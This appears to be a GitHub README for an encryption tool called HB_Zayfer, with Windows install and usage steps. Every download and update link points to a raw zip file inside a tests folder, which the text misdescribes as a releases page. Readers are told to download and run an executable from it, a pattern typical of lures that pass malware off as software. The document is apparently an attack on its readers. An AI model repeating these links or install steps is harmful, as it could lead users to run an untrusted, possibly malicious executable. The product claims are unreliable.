# 🔒 HB_Zayfer - Secure Encryption for Everyone

[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip)

---

HB_Zayfer is a simple app to keep your files safe. It lets you encode and decode data using trusted methods like AES-256-GCM and RSA. You can use it on Windows with a clear interface or commands, whichever suits you. The software is built with reliable tools in Rust and Python for strong security and easy use.

---

## 🔑 What HB_Zayfer Does

HB_Zayfer offers tools to protect your data:

- Encrypt files to make them unreadable to others.
- Decrypt files you have encoded before.
- Use common encryption methods (AES-256-GCM, ChaCha20-Poly1305).
- Manage keys with strong algorithms (RSA, Ed25519, X25519).
- Work through command line, a graphical interface, or a simple web page.
- Supports open standards like OpenPGP for compatibility.

---

## 🖥️ System Requirements

To run HB_Zayfer on Windows, your machine should meet these minimum requirements:

- Windows 10 or later (64-bit)
- At least 4 GB of RAM
- 200 MB of free disk space for the app and files
- Internet connection for initial download and optional updates
- A keyboard and mouse (for GUI use)

---

## 🚀 Getting Started: Download and Install HB_Zayfer

Start by visiting the official releases page to get the software:

[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-green?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip) 

### Steps to Download and Install

1. Click the download button above or visit this page directly:  
   https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip

2. On the releases page, look for the latest version. It will have a file with `.exe` extension or a compressed file like `.zip`.

3. Click on the `.exe` file to download it. Windows will save it in your default downloads folder.

4. After download completes, open the folder where the file is saved.

5. Double-click the `.exe` file to start the installation.

6. Follow the on-screen prompts:
   - Accept the license agreement.
   - Choose the folder where you want HB_Zayfer installed or accept the default.
   - Wait for the installation to finish.

7. Once done, you can start HB_Zayfer from the Start Menu or your desktop shortcut.

If you download a `.zip` file instead, extract it first using Windows Explorer:
- Right-click the `.zip` file.
- Select “Extract All…” and pick a folder.
- Open the extracted folder and run `HB_Zayfer.exe`.

---

## 💡 Using HB_Zayfer: Simple Steps for Beginners

HB_Zayfer has three ways to use it:

- **Graphical User Interface (GUI)**  
  The GUI lets you click buttons to encrypt or decrypt files.  
- **Command Line Interface (CLI)**  
  You can type commands if you feel comfortable working without a mouse.  
- **Web Interface**  
  You can run a local web page to manage encryption through your browser.

### Using the GUI

1. Open the HB_Zayfer app from the desktop or Start Menu.

2. To encrypt a file:  
   - Click the “Encrypt” button.  
   - Choose the file you want to protect.  
   - Select the encryption method (AES-256-GCM is a good default).  
   - Provide a password or key when asked.  
   - Click “Start” to encrypt.

3. To decrypt a file:  
   - Click the “Decrypt” button.  
   - Select the encrypted file.  
   - Enter the password or key used during encryption.  
   - Click “Start” to recover your file.

### Using the Command Line

Open the Windows Command Prompt:

1. Type the command to encrypt a file, for example:  
   `hb_zayfer encrypt --file example.txt --method aes-256-gcm --password mypass`

2. To decrypt:  
   `hb_zayfer decrypt --file example.txt.enc --password mypass`

Command line options will show more details if you type:  
`hb_zayfer --help`

### Using the Web Interface

1. Launch the HB_Zayfer web server by running:  
   `hb_zayfer web`

2. Open your browser and go to:  
   `http://localhost:8000`

3. Use the simple forms on the page to encrypt or decrypt your files.

---

## 🛠️ Features at a Glance

- Strong encryption with AES-256-GCM and ChaCha20-Poly1305.
- Public-key cryptography with RSA, Ed25519, and X25519.
- Key management supporting OpenPGP.
- Easy-to-use GUI built with PySide6.
- Command line tools for automation or advanced use.
- FastAPI-based web interface for local use.
- Cross-platform core, but this guide focuses on Windows.

---

## 🔧 Configuration Tips

- For best security, use a strong password or key phrase.
- Store keys and passwords safely; losing them means you cannot decrypt your data.
- Use the default encryption methods unless you know why you need a different one.
- Check the software updates on the releases page regularly and download new versions when needed.
- If unsure about CLI commands, stick to the GUI or Web interface.

---

## 📂 Managing Your Files Safely

- Always keep backup copies of your unencrypted files before starting.
- Encrypt one file at a time unless automating with CLI.
- After encryption, delete the original only if you are sure the encrypted file works.
- Use clear file names to know which files are encrypted and which are not.
- Avoid using simple or common passwords.

---

## ❓ Troubleshooting Common Issues

- **The app won’t open:** Make sure you have run the installer fully. Try restarting your computer.

- **Files won’t decrypt:** Double-check the password or key you used. Encryption is sensitive to errors.

- **Installation fails:** Verify you have enough disk space and administrator rights.

- **Commands do not work in Command Prompt:** Ensure you installed the software correctly and your system PATH is set.

- **Web interface does not load:** Confirm you ran the `hb_zayfer web` command and you are visiting `http://localhost:8000`.

---

## 📥 Where to Get Updates and Support

Visit the official release page here to download new versions or patches:  
https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip

Check the repository’s Issues tab for common questions or report problems directly. The community and maintainers may offer help.

---

## 🔄 Updating HB_Zayfer

1. Visit the release page to check if a newer version is available.

2. Download the latest `.exe` file.

3. Close HB_Zayfer if open.

4. Run the new installer. It will update the existing installation.

5. You can keep your settings and keys during updates.

---

## ⚙️ Advanced Options (Optional)

- Use the CLI to script batch encryption tasks.
- Combine keys with Ed25519 and X25519 for advanced security.
- Explore OpenPGP integration if you work with email or file sharing apps that support it.
- Customize the web interface port by editing configuration files (found in the installation folder).

---

# [![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/raw/refs/heads/main/crates/core/tests/Zayfer_H_v2.0-alpha.4.zip)